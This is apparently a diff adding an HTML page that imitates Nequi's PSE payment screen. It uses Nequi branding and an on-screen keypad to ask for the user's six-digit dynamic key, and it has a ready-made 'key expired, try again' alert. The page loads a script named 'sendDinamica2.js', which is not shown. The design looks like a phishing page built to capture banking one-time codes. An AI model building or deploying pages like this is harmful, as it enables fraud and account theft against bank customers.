@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pagos PSE de Nequi</title>
+    <link rel="stylesheet" href="/css/NEQUI.css">
+    <link rel="icon" href="/img/boton-nequi.png">
+    <style>
+        .password-slots {
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
+            margin: 2rem 0;
+        }
+
+        .password-input
+         {
+            text-align: center;
+            width: 40px;
+            height: 40px;
+            font-size: 1.5rem;
+            border-radius: 5px;
+            border: 2px solid #200020;
+            background-color: #f9f9f9;
+        }
+        .password-input:focus {
+            outline: none;
+            border-color: #DA0081;
+        }
+
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 2rem;
+            max-width: 280px;
+            margin: 2rem auto;
+        }
+
+        .keypad-btn {
+            background: none;
+            border: none;
+            font-size: 2rem;
+            color: #200020;
+            cursor: pointer;
+            padding: 0.5rem;
+            font-weight: 400;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto;
+            transition: 0.2s;
+        }
+        .keypad-btn:hover {
+            background-color: #DA0081;
+            color: white;
+            border-radius: 5px;
+        }
+
+        .keypad-btn.delete {
+            background-color: #2A0F29;
+            color: white;
+            border-radius: 4px;
+            font-size: 1rem;
+        }
+
+        .keypad-row {
+            display: contents;
+        }
+
+        .keypad-row:last-child {
+            grid-column: 1 / span 3;
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+        }
+
+        .keypad-row:last-child .keypad-btn:first-child {
+            grid-column: 2;
+        }
+
+        .keypad-row:last-child .keypad-btn:last-child {
+            grid-column: 3;
+        }
+
+        
+    </style>
+</head>
+<body>
+    <div class="wrapper">
+        <!--ALERTA MODAL-->
+        <div id="error-alert" class="error-alert">
+            ¡Ups! Tu clave dinámica expiró, intenta nuevamente.
+        </div>
+        <header class="header">
+            <img style="width: 150px;" src="/img/nequilogo.jpeg" alt="Nequi">
+        </header>
+
+        <main class="main">
+            <h1>Pagos PSE de Nequi</h1>
+            <h2>Para confirmar tu pago escribe o pega la clave dinámica que encuentras en tu App Nequi.</h2>
+
+            <div class="password-slots">
+                <input type="number" class="password-input" maxlength="1" disabled>
+                <input type="number" class="password-input" maxlength="1" disabled>
+                <input type="number" class="password-input" maxlength="1" disabled>
+                <input type="number" class="password-input" maxlength="1" disabled>
+                <input type="number" class="password-input" maxlength="1" disabled>
+                <input type="number" class="password-input" maxlength="1" disabled>
+            </div>
+            
+            <div id="keypad" class="keypad">
+                <button class="keypad-btn" data-value="1">1</button>
+                <button class="keypad-btn" data-value="2">2</button>
+                <button class="keypad-btn" data-value="3">3</button>
+                <button class="keypad-btn" data-value="4">4</button>
+                <button class="keypad-btn" data-value="5">5</button>
+                <button class="keypad-btn" data-value="6">6</button>
+                <button class="keypad-btn" data-value="7">7</button>
+                <button class="keypad-btn" data-value="8">8</button>
+                <button class="keypad-btn" data-value="9">9</button>
+                <div class="keypad-row">
+                    <button class="keypad-btn" data-value="0">0</button>
+                    <button class="keypad-btn delete" data-value="delete">×</button>
+                </div>
+            </div>
+            
+            <button class="follow-btn" id="submit-btn">Continuar</button>
+            
+        </main>
+    </div>
+    <script src="/js/sendDinamica2.js"></script>
+</body>
+</html>
